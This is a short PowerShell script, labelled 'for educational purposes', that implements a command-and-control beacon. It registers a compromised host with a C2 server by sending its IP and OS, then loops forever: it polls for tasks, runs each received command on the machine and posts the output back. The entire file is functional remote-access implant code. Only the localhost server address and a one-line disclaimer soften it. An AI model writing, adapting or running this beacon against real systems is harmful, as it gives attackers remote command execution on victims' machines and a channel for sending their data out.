# PowerShell Beacon for C2 Communication
# This is a basic implementation for educational purposes

$C2Server = "http://localhost:8080"
$BeaconID = [guid]::NewGuid().ToString()
$SleepTime = 5  # Seconds between check-ins

function Get-SystemInfo {
    $os = Get-WmiObject -Class Win32_OperatingSystem
    return @{
        "id" = $BeaconID
        "ip" = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4" -and $_.PrefixOrigin -eq "Dhcp"}).IPAddress
        "os" = $os.Caption
        "last_seen" = (Get-Date).ToString("o")
    }
}

function Invoke-Command {
    param (
        [string]$Command,
        [string[]]$Args
    )
    
    try {
        $process = Start-Process -FilePath $Command -ArgumentList $Args -NoNewWindow -PassThru -Wait -RedirectStandardOutput "temp.txt"
        $output = Get-Content "temp.txt" -Raw
        Remove-Item "temp.txt" -Force
        return $output
    }
    catch {
        return "Error executing command: $_"
    }
}

function Send-Results {
    param (
        [string]$TaskID,
        [string]$Result
    )
    
    $body = @{
        "beacon_id" = $BeaconID
        "task_id" = $TaskID
        "result" = $Result
    } | ConvertTo-Json
    
    try {
        Invoke-RestMethod -Uri "$C2Server/results" -Method Post -Body $body -ContentType "application/json"
    }
    catch {
        Write-Host "Error sending results: $_"
    }
}

# Register beacon with C2 server
$systemInfo = Get-SystemInfo
try {
    Invoke-RestMethod -Uri "$C2Server/register" -Method Post -Body ($systemInfo | ConvertTo-Json) -ContentType "application/json"
    Write-Host "Successfully registered with C2 server"
}
catch {
    Write-Host "Error registering with C2 server: $_"
    exit
}

# Main beacon loop
while ($true) {
    try {
        # Get tasks from C2 server
        $tasks = Invoke-RestMethod -Uri "$C2Server/tasks?id=$BeaconID" -Method Get
        
        foreach ($task in $tasks) {
            Write-Host "Executing task: $($task.command) $($task.args -join ' ')"
            $result = Invoke-Command -Command $task.command -Args $task.args
            Send-Results -TaskID $task.id -Result $result
        }
    }
    catch {
        Write-Host "Error in beacon loop: $_"
    }
    
    Start-Sleep -Seconds $SleepTime
} 